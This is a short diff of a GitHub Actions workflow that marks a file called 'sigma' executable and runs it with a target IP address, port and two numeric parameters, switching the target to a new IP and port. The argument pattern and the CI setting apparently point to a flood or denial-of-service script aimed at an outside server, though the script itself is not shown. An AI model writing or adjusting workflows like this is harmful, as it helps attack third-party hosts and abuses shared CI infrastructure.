@@ -9,4 +9,4 @@ jobs:
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x sigma
-    - run: python3 sigma 91.108.17.9 32000 120 200
+    - run: python3 sigma 91.108.9.183 32002 80 200
